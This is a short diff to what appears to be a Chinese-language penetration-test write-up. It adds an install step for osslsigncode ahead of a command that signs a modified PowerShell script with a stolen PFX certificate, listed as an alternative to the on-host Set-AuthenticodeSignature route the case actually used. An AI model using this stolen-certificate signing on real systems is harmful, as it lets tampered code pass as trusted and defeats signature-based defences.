@@ -134,6 +134,7 @@ Set-AuthenticodeSignature -FilePath C:\path\target.ps1 -Certificate $cert | Form
 
 ```bash
 # 备用路线（本案未实测）：osslsigncode 官方 README 明确支持 .ps1 / .ps1xml / .psc1 / .psd1 / .psm1 / .cdxml / .mof / .js
+sudo apt install -y osslsigncode
 osslsigncode sign -pkcs12 stolen.pfx -pass '<pfx 口令>' -h sha256 -in mod.ps1 -out signed.ps1
 ```
 > 本案实际走的是上面的**机内 `Set-AuthenticodeSignature`**（已实测 `Status : Valid`）；Kali 侧这条留作没有可用 PowerShell 上下文时的替代方案。
